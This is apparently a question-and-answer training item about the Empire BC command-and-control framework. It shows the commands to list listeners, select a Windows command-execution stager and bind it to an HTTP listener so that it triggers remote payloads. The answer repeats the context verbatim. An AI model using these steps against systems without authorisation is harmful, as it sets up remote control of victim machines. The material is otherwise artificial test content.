Context:## Setting Up a Listener

Before generating a payload, you must configure a listener. The listener acts as the point of communication between the payload and the Empire server.

1. **List Available Listeners**:
    ```bash
    listeners
```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Windows Command Execution via CMD for Remote Payloads with Empire BC
This payload creates a command execution script to trigger remote payloads.

1. **Select the Stager**:
    ```bash
    usestager windows_cmd_exec
```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute

 Question: Generate an example of how *bind a stager* to a listener with Empire BC. Returns *only bash commands* in the final answer. 

 Your response: 


### Windows Command Execution via CMD for Remote Payloads with Empire BC
This payload creates a command execution script to trigger remote payloads.

1. **Select the Stager**:
    ```bash
    usestager windows_cmd_exec
```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
```